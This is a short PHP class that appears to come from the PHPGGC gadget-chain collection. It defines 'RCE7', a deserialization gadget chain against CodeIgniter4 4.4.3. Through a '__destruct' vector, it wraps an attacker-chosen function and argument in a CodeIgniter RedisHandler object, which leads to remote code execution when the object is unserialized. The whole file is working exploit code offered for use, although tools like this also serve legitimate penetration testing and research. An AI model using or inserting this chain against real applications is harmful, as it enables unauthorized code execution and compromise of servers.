<?php

namespace GadgetChain\CodeIgniter4;

class RCE7 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = 'public4.4.3';
    public static $vector = '__destruct';
    public static $author = 'ahmadshauqi';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \CodeIgniter\Cache\Handlers\RedisHandler($function, $parameter);
    }
}
